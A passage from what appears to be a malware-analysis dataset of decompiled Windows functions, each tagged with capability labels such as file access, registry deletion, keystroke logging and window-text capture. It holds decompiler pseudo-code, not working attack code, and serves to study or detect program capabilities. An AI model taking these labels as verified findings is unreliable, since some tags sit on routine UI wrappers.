= *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *pcVar7 = *pcVar7 + uVar5;\n    *(unaff_EBX + 0x4965b830) = *(unaff_EBX + 0x4965b830) + uVar5;\n    // [01] -r-x section size 8192 named .itext\n    uVar3 = *puVar13;\n    *puVar13 = *puVar13 + uVar5;\n    if (CARRY1(uVar3, uVar5)) {\n        *(pcVar8 + 4) = 0x490012;\n        fcn.00402cdc();\n        *0x49200c = 2;\n        *0x496014 = 0x40126c;\n        *0x496018 = 0x40127c;\n        *0x49604e = 2;\n        *0x496000 = 0x406494;\n        *(pcVar8 + 4) = 0x490043;\n        cVar6 = fcn.00404418();\n        if (cVar6 != '\\0') {\n            *(pcVar8 + 4) = 0x49004c;\n            fcn.00404448();\n        }\n        *(pcVar8 + 4) = 0x490051;\n        fcn.0040450c();\n        *0x496054 = 0xd7b0;\n        *0x496220 = 0xd7b0;\n        *0x4963ec = 0xd7b0;\n        *(pcVar8 + 4) = 0x490071;\n        *0x496040 = sub.kernel32.dll_GetCommandLineA();\n        *(pcVar8 + 4) = 0x49007b;\n        *0x49603c = fcn.004013bc();\n        *(pcVar8 + 4) = 0x490085;\n        *0x4965bc = sub.kernel32.dll_GetACP();\n        *(pcVar8 + 4) = 0x49008f;\n        *0x496034 = sub.kernel32.dll_GetCurrentThreadId();\n    }\n    return;\n}\n",
        "token_count": 36086
    },
    "0040a1cc": {
        "rules": [
            "read file on Windows"
        ],
        "decompiled_code": "\nulong fcn.0040a1cc(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uStack36;\n    \n    iVar1 = sub.kernel32.dll_ReadFile_1();\n    uStack36 = in_EAX;\n    if (iVar1 == 0) {\n        uStack36 = 0xffffffff;\n    }\n    return CONCAT44(uStack36, uStack36);\n}\n",
        "token_count": 89
    },
    "0040a1f8": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nulong fcn.0040a1f8(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uStack36;\n    \n    iVar1 = sub.kernel32.dll_WriteFile_1();\n    uStack36 = in_EAX;\n    if (iVar1 == 0) {\n        uStack36 = 0xffffffff;\n    }\n    return CONCAT44(uStack36, uStack36);\n}\n",
        "token_count": 90
    },
    "00421f14": {
        "rules": [
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00421f14(uchar *param_1)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t unaff_EBX;\n    uint uVar4;\n    uchar *puStack20;\n    \n    puStack20 = param_1;\n    fcn.00403af4();\n    uVar2 = fcn.004059dc(0, &puStack20, 0, param_1 + 4);\n    uVar4 = *(in_EAX + 4);\n    iVar3 = sub.advapi32.dll_RegQueryValueExA_1(uVar4, uVar2);\n    uVar1 = fcn.00421648();\n    *param_1 = uVar1;\n    return CONCAT44(uVar4, unaff_EBX & 0xffffff00 | iVar3 == 0);\n}\n",
        "token_count": 200
    },
    "0042c1d8": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nvoid fcn.0042c1d8(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x42c24c);\n    if (iVar1 != 0) {\n        *0x492e9c = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42c258);\n        *0x492ea0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42c26c);\n        *0x492ea4 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42c27c);\n        *0x492ea8 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42c294);\n        *0x492eac = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42c2ac);\n        *0x492eb0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42c2c4);\n    }\n    return;\n}\n",
        "token_count": 228
    },
    "00431c90": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nvoid fcn.00431c90(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x431df4);\n    if (iVar1 != 0) {\n        *0x49abf8 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431e04);\n        *0x49abfc = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431e18);\n        *0x49abf0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431e2c);\n        *0x49abf4 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431e44);\n        *0x49abcc = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431e5c);\n        if (*0x49abcc == 0) {\n            *0x49abcc = 0x408080;\n        }\n        *0x49abd0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431e74);\n        if (*0x49abd0 == 0) {\n            *0x49abd0 = 0x4084f0;\n        }\n        *0x49abd4 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431e8c);\n        if (*0x49abd4 == 0) {\n            *0x49abd4 = 0x408210;\n        }\n        *0x49abd8 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431ea4);\n        if (*0x49abd8 == 0) {\n            *0x49abd8 = 0x408200;\n        }\n        *0x49abdc = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431ebc);\n        if (*0x49abdc == 0) {\n            *0x49abdc = 0x408208;\n        }\n        *0x49abe0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431ed0);\n        if (*0x49abe0 == 0) {\n            *0x49abe0 = 0x4084a0;\n        }\n        *0x49abe4 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431ee4);\n        if (*0x49abe4 == 0) {\n            *0x49abe4 = 0x408498;\n        }\n        *0x49abe8 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431efc);\n        if (*0x49abe8 == 0) {\n            *0x49abe8 = 0x4084a8;\n        }\n    }\n    return;\n}\n",
        "token_count": 625
    },
    "00447cf0": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00447cf0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x447d14);\n    if (iVar1 != 0) {\n        *0x493504 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x447d20);\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "0040d388": {
        "rules": [
            "get geographical location"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040d388(uint32_t param_1)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetLocaleInfoA_1();\n    if (0 < iVar1) {\n        param_1 = in_EAX & 0xff;\n    }\n    return CONCAT44(in_EAX, param_1);\n}\n",
        "token_count": 87
    },
    "00407688": {
        "rules": [
            "get thread local storage value"
        ],
        "decompiled_code": "\nint32_t fcn.00407688(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    \n    if (*0x4987f4 == '\\0') {\n        return *(*(in_FS_OFFSET + 0x2c) + *0x4927b8 * 4);\n    }\n    iVar1 = sub.kernel32.dll_TlsGetValue(*0x4927b8);\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    fcn.00407644();\n    iVar1 = sub.kernel32.dll_TlsGetValue(*0x4927b8);\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    return *0x4987fc;\n}\n",
        "token_count": 161
    },
    "0041c280": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c280(uint noname_0, uint lpType)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint lpName;\n    \n    iVar1 = sub.kernel32.dll_FindResourceA();\n    *(in_EAX + 0x10) = iVar1;\n    if (iVar1 == 0) {\n        fcn.0041c1e0(&stack0xfffffffc);\n    }\n    iVar1 = sub.kernel32.dll_LoadResource();\n    *(in_EAX + 0x14) = iVar1;\n    if (iVar1 == 0) {\n        fcn.0041c1e0(&stack0xfffffffc);\n    }\n    uVar2 = sub.kernel32.dll_SizeofResource();\n    sub.kernel32.dll_LockResource(*(in_EAX + 0x14), uVar2);\n    fcn.0041bdd0();\n    return;\n}\n",
        "token_count": 206
    },
    "00421cfc": {
        "rules": [
            "delete registry value"
        ],
        "decompiled_code": "\nuint32_t fcn.00421cfc(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = fcn.004059dc();\n    uVar2 = sub.advapi32.dll_RegDeleteValueA(*(in_EAX + 4), uVar1);\n    return uVar2 & 0xffffff00 | uVar2 == 0;\n}\n",
        "token_count": 94
    },
    "00481bb0": {
        "rules": [
            "log keystrokes"
        ],
        "decompiled_code": "\nuint fcn.00481bb0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.user32.dll_MapVirtualKeyA();\n    if (iVar1 == 0x1a) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 59
    },
    "0043bbec": {
        "rules": [
            "log keystrokes via polling"
        ],
        "decompiled_code": "\nuint8_t fcn.0043bbec(void)\n\n{\n    int16_t iVar1;\n    uint32_t in_EAX;\n    uint8_t uVar2;\n    \n    uVar2 = *0x43bc28;\n    iVar1 = sub.user32.dll_GetKeyState(0x10);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 1;\n    }\n    iVar1 = sub.user32.dll_GetKeyState(0x11);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 4;\n    }\n    if ((in_EAX & 0x20000000) != 0) {\n        uVar2 = uVar2 | 2;\n    }\n    return uVar2;\n}\n",
        "token_count": 170
    },
    "0046f4ac": {
        "rules": [
            "enumerate gui resources"
        ],
        "decompiled_code": "\nvoid fcn.0046f4ac(void)\n\n{\n    fcn.00405530();\n    sub.user32.dll_EnumWindows(fcn.0046f298, 0);\n    fcn.00405584();\n    return;\n}\n",
        "token_count": 52
    },
    "0046f6d8": {
        "rules": [
            "enumerate gui resources"
        ],
        "decompiled_code": "\nvoid fcn.0046f6d8(void)\n\n{\n    fcn.00405530();\n    sub.user32.dll_EnumWindows(fcn.0046f4d4, 0);\n    fcn.00405584();\n    return;\n}\n",
        "token_count": 55
    },
    "0046f7fc": {
        "rules": [
            "enumerate gui resources"
        ],
        "decompiled_code": "\nvoid fcn.0046f7fc(void)\n\n{\n    fcn.00405530();\n    sub.user32.dll_EnumWindows(fcn.0046f700, 0);\n    fcn.00405584();\n    return;\n}\n",
        "token_count": 52
    },
    "00481240": {
        "rules": [
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid fcn.00481240(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd0;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4812ad;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405530();\n    iVar1 = sub.user32.dll_GetForegroundWindow();\n    if (iVar1 != 0) {\n        iVar2 = sub.user32.dll_GetWindowTextLengthA(iVar1);\n        fcn.00405c6c();\n        uVar3 = fcn.004059dc(iVar2 + 1);\n        sub.user32.dll_GetWindowTextA(iVar1, uVar3);\n        fcn.00409c28();\n        in_stack_ffffffd0 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00405530(0x4812b4);\n    return;\n}\n",
        "token_count": 268
    },
    "0048d788": {
        "rules": [
            "get graphical window text"
        ],
